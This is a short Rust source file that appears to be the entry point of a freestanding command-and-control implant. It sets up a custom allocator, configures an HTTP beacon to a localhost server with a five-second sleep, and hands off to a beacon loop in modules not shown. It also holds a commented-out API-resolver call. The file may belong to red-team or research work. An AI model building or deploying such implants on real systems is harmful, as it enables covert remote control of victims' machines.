#![no_std]
#![no_main]

extern crate alloc;

pub mod utils;
pub mod c2;

// Global Allocator
#[global_allocator]
static ALLOCATOR: utils::heap::MiniHeap = utils::heap::MiniHeap::new(0x10000000, 1024 * 1024);

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

#[no_mangle]
pub extern "C" fn _start() -> ! {
    // 1. Initialize
    // utils::api_resolver::init();
    
    let config = c2::C2Config {
        transport: c2::TransportType::Http,
        server_addr: "127.0.0.1",
        sleep_interval: 5000,
    };

    // 2. Enter C2 Loop
    c2::run_beacon_loop(config);
}